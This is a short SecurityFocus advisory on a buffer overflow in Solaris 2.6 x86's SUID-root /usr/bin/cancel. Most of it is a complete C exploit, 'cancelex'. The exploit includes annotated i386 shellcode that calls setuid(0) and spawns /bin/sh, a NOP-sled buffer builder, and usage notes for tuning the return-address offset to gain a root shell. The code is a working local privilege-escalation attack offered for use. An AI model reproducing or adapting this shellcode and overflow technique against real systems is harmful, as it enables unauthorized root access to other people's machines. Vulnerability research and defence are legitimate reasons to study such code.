source: http://www.securityfocus.com/bid/293/info

A buffer overrun condition was discovered in Solaris 2.6 X_86 in /usr/bin/cancel. This buffer overflow is apparently present in the SPARC version as well although it is thought to be unexploitable. Previous versions of Solaris did not ship with /usr/bin/cancel as SUID root, so while the buffer overflow was present it was harmless. Solaris 7.0 fixes this problem by changing the vulnerable function call. 

/**
*** cancelex - i386 Solaris root exploit for /usr/bin/cancel
***
*** Tested and confirmed under Solaris 2.6 (i386)
***
*** Usage: % cancelex hostname [offset]
***
*** where hostname is the name of a host running the printer service on
*** TCP port 515 (such as "localhost" perhaps) and offset (if present)
*** is the number of bytes to add to the stack pointer to calculate your
*** target return address; try -1000 to 1000 in increments of 100 for
*** starters.
***
*** Cheez Whiz
*** cheezbeast@hotmail.com
***
*** February 25, 1999
**/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BUFLEN 1031
#define NOP 0x90

char shell[] =
/* 0 */ "\xeb\x3b" /* jmp springboard */
/* syscall: */
/* 2 */ "\x9a\xff\xff\xff\xff\x07\xff" /* lcall 0x7,0x0 */
/* 9 */ "\xc3" /* ret */
/* start: */
/* 10 */ "\x5e" /* popl %esi */
/* 11 */ "\x31\xc0" /* xor %eax,%eax */
/* 13 */ "\x89\x46\xc1" /* movl %eax,-0x3f(%esi) */
/* 16 */ "\x88\x46\xc6" /* movb %al,-0x3a(%esi) */
/* 19 */ "\x88\x46\x07" /* movb %al,0x7(%esi) */
/* 22 */ "\x89\x46\x0c" /* movl %eax,0xc(%esi) */
/* setuid: */
/* 25 */ "\x31\xc0" /* xor %eax,%eax */
/* 27 */ "\x50" /* pushl %eax */
/* 28 */ "\xb0\x17" /* movb $0x17,%al */
/* 30 */ "\xe8\xdf\xff\xff\xff" /* call syscall */
/* 35 */ "\x83\xc4\x04" /* addl $0x4,%esp */
/* execve: */
/* 38 */ "\x31\xc0" /* xor %eax,%eax */
/* 40 */ "\x50" /* pushl %eax */
/* 41 */ "\x8d\x5e\x08" /* leal 0x8(%esi),%ebx */
/* 44 */ "\x53" /* pushl %ebx */
/* 45 */ "\x8d\x1e" /* leal (%esi),%ebx */
/* 47 */ "\x89\x5e\x08" /* movl %ebx,0x8(%esi) */
/* 50 */ "\x53" /* pushl %ebx */
/* 51 */ "\xb0\x3b" /* movb $0x3b,%al */
/* 53 */ "\xe8\xc8\xff\xff\xff" /* call syscall */
/* 58 */ "\x83\xc4\x0c" /* addl $0xc,%esp */
/* springboard: */
/* 61 */ "\xe8\xc8\xff\xff\xff" /* call start */
/* data: */
/* 66 */ "\x2f\x62\x69\x6e\x2f\x73\x68\xff" /* DATA */
/* 74 */ "\xff\xff\xff\xff" /* DATA */
/* 78 */ "\xff\xff\xff\xff"; /* DATA */

char buf[BUFLEN+1];
char *egg;
unsigned long int esp, nop;
long int offset = 0;

unsigned long int
get_esp()
{
__asm__("movl %esp,%eax");
}

void
main(int argc, char *argv[])
{
int i;

if (argc < 2) {
printf("usage: %s hostname [offset]\n", argv[0]);
return;
}

esp = get_esp();

if (argc > 2)
offset = strtol(argv[2], NULL, 0);

if (argc > 3)
nop = strtoul(argv[3], NULL, 0);
else
nop = 933;

memset(buf, NOP, BUFLEN);
memcpy(buf+nop, shell, strlen(shell));
for (i = nop+strlen(shell); i <= BUFLEN-4; i += 4)
*((int *) &buf[i]) = esp+offset;

if ((egg = (char *) malloc(strlen(argv[1])+1+BUFLEN+1)) == NULL) {
printf("malloc failed!\n");
return;
}
snprintf(egg, strlen(argv[1])+1+BUFLEN+1, "%s:%s", argv[1], buf);

printf("jumping to 0x%08x (0x%08x offset %d) [nop %d]\n",
esp+offset, esp, offset, nop);
execl("/usr/bin/cancel", "cancel", egg, NULL);
/* execl("/usr/ucb/lprm", "lprm", "-P", egg, NULL); */

printf("exec failed!\n");
return;
}